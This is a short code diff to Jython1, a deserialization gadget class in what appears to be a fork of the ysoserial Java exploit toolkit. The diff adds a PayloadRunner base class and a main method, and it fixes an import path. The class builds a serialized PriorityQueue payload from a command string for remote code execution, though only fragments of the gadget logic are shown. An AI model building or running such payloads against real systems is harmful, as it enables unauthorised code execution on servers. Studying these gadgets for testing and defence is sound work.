@@ -1,5 +1,6 @@
 package A.R.ysogate.payloads.gadgets;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.apache.commons.io.FileUtils;
 import org.python.core.*;
 
@@ -12,7 +13,7 @@ import java.util.PriorityQueue;
 
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Reflections;
 import A.R.ysogate.payloads.annotation.Dependencies;
 
 /**
@@ -41,7 +42,7 @@ import A.R.ysogate.payloads.annotation.Dependencies;
 @SuppressWarnings({"rawtypes", "unchecked", "restriction"})
 @Dependencies({"org.python:jython-standalone:2.5.2"})
 @Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
-public class Jython1 implements ObjectPayload<PriorityQueue> {
+public class Jython1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
 
 	public PriorityQueue getObject(String command) throws Exception {
 
@@ -98,5 +99,9 @@ public class Jython1 implements ObjectPayload<PriorityQueue> {
 		Reflections.setFieldValue(priorityQueue, "size", 2);
 
 		return priorityQueue;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(Jython1.class, args);
 	}
 }
